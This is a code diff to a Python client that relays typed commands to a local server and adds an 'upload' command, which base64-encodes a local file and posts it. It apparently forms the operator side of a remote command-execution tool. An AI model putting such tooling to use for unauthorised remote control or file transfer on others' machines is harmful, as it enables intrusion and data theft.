@@ -1,6 +1,8 @@
 import requests
 import json
 import threading
+import base64
+import os
 
 
 SERVER_IP = 'http://127.0.0.1:5000'
@@ -33,10 +35,33 @@ def send():
             print(lastest, flush=True)
             lastest = None
             proceed = True
-        if proceed:
-            cmd = input(cd)
-            requests.post(SERVER_IP + '/client/send', json=json.dumps({'command': cmd})).text
+
+        if not proceed:
+            continue
+
+        cmd = input(cd)
+
+        if cmd.startswith('upload '):
+            path = cmd.split(maxsplit=1)[1]
+            filename = os.path.basename(path)
+            try:
+                with open(path, 'rb') as f:
+                    file_data = base64.b64encode(f.read()).decode()
+                requests.post(SERVER_IP + '/client/send', json=json.dumps({
+                    'command': 'upload',
+                    'filename': filename,
+                    'filedata': file_data
+                }))
+            except Exception as e:
+                print(f"\033[31mUpload failed: {e}\033[0m")
+                proceed = True
+                continue
+
             proceed = False
+            continue
+        
+        requests.post(SERVER_IP + '/client/send', json=json.dumps({'command': cmd}))
+        proceed = False
     terminate = True
 
 
